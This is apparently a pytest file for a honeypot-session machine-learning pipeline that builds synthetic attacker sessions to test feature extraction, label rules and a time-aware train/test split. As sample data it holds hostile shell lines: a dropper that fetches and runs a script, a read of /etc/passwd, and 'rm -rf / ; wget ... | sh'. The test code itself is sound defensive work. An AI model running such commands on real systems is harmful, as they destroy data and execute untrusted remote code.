"""Honeypot-session ML pipeline: features, provenance, leakage-safe split, readiness gate (docs/SESSION_ML.md).
The data used here is SYNTHETIC and exists only to test the pipeline; no session classifier is shipped."""
import random

import pytest

from session_ml import pipeline as P
from utils.features import classify_honeypot_session

T0 = 1_760_000_000.0


def session(kind, rng):
    if kind == "dropper":
        cmds = ["uname -a", "wget http://203.0.113.10/x.sh", "chmod +x x.sh", "./x.sh"]
        intents = ["RECONNAISSANCE", "MALWARE_DOWNLOAD", "MALWARE_DOWNLOAD", "MALWARE_DOWNLOAD"]
    else:
        cmds = ["uname -a", "id", "cat /etc/passwd", "ps aux"][: rng.randint(2, 4)]
        intents = ["RECONNAISSANCE"] * len(cmds)
    t = T0 + rng.random() * 1000
    return {"commands": [{"command": c, "intent": i, "timestamp": t + k * rng.randint(2, 30)} for k, (c, i) in enumerate(zip(cmds, intents))],
            "durationSeconds": rng.randint(10, 300), "loginSucceeded": True, "iocCount": int(kind == "dropper")}


def test_features_are_stable_named_and_never_execute_commands():
    f = P.extract_features({"commands": [{"command": "rm -rf / ; wget http://x/y | sh", "intent": "MALWARE_DOWNLOAD", "timestamp": 1},
                                         {"command": "systemd-detect-virt", "intent": "RECONNAISSANCE", "timestamp": 4}],
                            "durationSeconds": 9})
    assert sorted(f) == P.FEATURE_NAMES
    assert f["downloads"] == 1 and f["fingerprint_commands"] == 1 and f["gap_mean_s"] == 3
    assert f["intent_malware_download"] == 1 and f["pipes_and_redirects"] == 1
    assert P.extract_features({})["n_commands"] == 0


def test_label_provenance_rules():
    with pytest.raises(ValueError):
        P.make_label("s", "x", "guess", "a", T0)
    with pytest.raises(ValueError):
        P.make_label("s", "x", "manual", "", T0)
    with pytest.raises(ValueError):
        P.make_label("s", "x", "external", "feed", T0)
    assert P.make_label("s", "x", "external", "feed", T0, reference="corpus-v1")["method"] == "external"


def test_rule_labels_never_make_the_pipeline_ready():
    labels = [P.make_label(f"s{i}", "RCE" if i % 2 else "BENIGN", "rule", "honeypot_rules", T0 + i * 86400) for i in range(500)]
    r = P.readiness(labels)
    assert r["ready"] is False and r["independentLabels"] == 0 and r["ruleLabels"] == 500


def test_current_project_data_is_not_ready():
    """27 closed sessions, all rule-labelled, none verified (sentinel-demo + sentinel-db on 2026-11-13)."""
    labels = [P.make_label(f"s{i}", "BENIGN", "rule", "honeypot_rules", T0) for i in range(27)]
    assert P.train_and_evaluate([dict(l, session={}, sourceIP="x") for l in labels], classify_honeypot_session)["trained"] is False


def test_time_aware_split_keeps_attackers_and_sessions_on_one_side():
    rng = random.Random(0)
    rows = [{"sessionId": f"s{i}", "sourceIP": f"198.51.100.{i // 5}", "startTime": T0 + i * 3600} for i in range(70)]  # each attacker active for 5 h
    rng.shuffle(rows)
    train, test = P.time_aware_split(rows)
    assert train and test
    assert max(r["startTime"] for r in train) < min(r["startTime"] for r in test)  # strictly earlier
    assert not ({r["sourceIP"] for r in train} & {r["sourceIP"] for r in test})


def test_harness_compares_candidate_with_rule_baseline_on_synthetic_data():
    rng = random.Random(1)
    rows = []
    for i in range(120):
        kind = "dropper" if i % 2 else "recon"
        rows.append({"sessionId": f"s{i}", "sourceIP": f"203.0.113.{i}", "label": kind, "method": "manual",
                     "startTime": T0 + i * 86400 / 4, "session": session(kind, rng)})
    rule = lambda s: "dropper" if any("wget" in c["command"] for c in s["commands"]) else "recon"  # noqa: E731
    r = P.train_and_evaluate(rows, rule)
    assert r["readiness"]["ready"] is True and r["trained"] and r["shadowOnly"]
    assert set(r["candidate"]["perClass"]) == {"dropper", "recon"}
    assert r["candidate"]["confusion"]["labels"] == ["dropper", "recon"]
    assert r["ruleBaseline"]["macroF1"] >= 0.9
    assert r["exampleExplanation"]["topContributions"]
